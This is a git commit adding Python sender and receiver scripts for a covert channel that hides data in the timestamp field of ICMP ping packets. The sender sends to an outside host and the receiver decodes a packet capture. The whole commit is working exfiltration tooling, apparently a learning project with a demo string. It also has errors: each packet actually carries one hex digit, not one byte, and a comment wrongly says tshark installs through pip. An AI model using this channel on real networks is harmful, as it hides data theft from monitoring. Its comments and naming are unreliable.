21b278fa63dc4aad4c7d5704dff6cb11b19b136b
hoangdanhnhat <luftheone@gmail.com>
2025-04-18 10:03:28 +0700

    complete 1 byte per packet sender and receiver

---
+++ receiver-1byte-per-packet.py
@@ -0,0 +1,19 @@
+from pyshark import * #must install tshark first with pip install tshark
+
+file_path = "/home/ratatoui1e/Documents/projectI/pcap_files/helloworld-1bpp.pcapng" # change this
+cap = FileCapture(file_path, display_filter="icmp")
+
+secret_text_hex = ""
+
+for packet in cap:
+    try:
+        if packet.ip.src == "172.20.10.3": # change this to match the sender ip address
+            data_time = packet.icmp.data_time
+            least_significant_byte = data_time.raw_value[-1]
+            secret_text_hex += least_significant_byte
+
+    except AttributeError:
+        continue
+
+cap.close()
+print(bytes.fromhex(secret_text_hex).decode('utf-8'))
---
+++ sender-1byte-per-packet.py
@@ -0,0 +1,48 @@
+from scapy.all import IP, ICMP, sr1
+import time
+import struct
+
+def build_ping_packet(dst_ip, identifier, sequence_number, byte):
+    # Current time for timestamp
+    now = time.time()
+    seconds = int(now)
+    microseconds = int((now - seconds) * 1_000_000)
+    microseconds_hex = hex(microseconds)[2:-1] + byte
+    malicious_mircoseconds = int(microseconds_hex, 16)
+
+    # Create timestamp (8 bytes) - seconds and microseconds
+    timestamp = struct.pack('!II', seconds, malicious_mircoseconds)
+
+    # Create pattern to fill the payload (after timestamp)
+    pattern = bytes(range(0x10, 0x10 + 40))  # 40 bytes: 0x10 to 0x37
+
+    # Final payload: timestamp + pattern (total 40 bytes)
+    payload = timestamp + pattern
+
+    # Build full packet
+    packet = IP(dst=dst_ip)/ICMP(id=identifier, seq=sequence_number)/payload
+
+    return packet
+
+if __name__ == "__main__":
+    # Target IP address
+    target = "1.1.1.1"
+
+    # Example ID and Sequence
+    icmp_id = 3417
+    icmp_seq = 0
+
+    secretText = "Hello world!" # Change secret text here
+    secretText_hex = secretText.encode('utf-8').hex()
+
+    for byte in secretText_hex: 
+        # Build packet
+        icmp_seq += 1   
+        pkt = build_ping_packet(target, icmp_id, icmp_seq, byte)
+        # Send packet
+        response = sr1(pkt, timeout = 2, verbose = 0)
+        if response:
+            print(f"Received response for icmp_seq {icmp_seq} from {response.src}")
+        else:
+            print("No response received (timeout)")
+        time.sleep(1) #change to adjust transfer speed
